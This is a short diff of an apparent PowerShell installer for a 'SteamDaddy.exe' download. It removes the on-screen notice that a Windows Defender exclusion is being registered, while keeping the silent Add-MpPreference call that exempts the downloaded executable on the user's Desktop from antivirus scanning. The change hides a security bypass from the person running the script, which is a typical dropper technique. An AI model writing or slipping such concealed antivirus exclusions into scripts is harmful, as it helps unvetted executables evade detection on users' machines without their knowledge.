@@ -12,7 +12,6 @@ try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $destPath = Join-Path $desktop "SteamDaddy.exe"
 
-    Write-Host "[SteamDaddy] Registering Windows Defender Exclusion..." -ForegroundColor Cyan
     try { Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue } catch {}
 
     Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
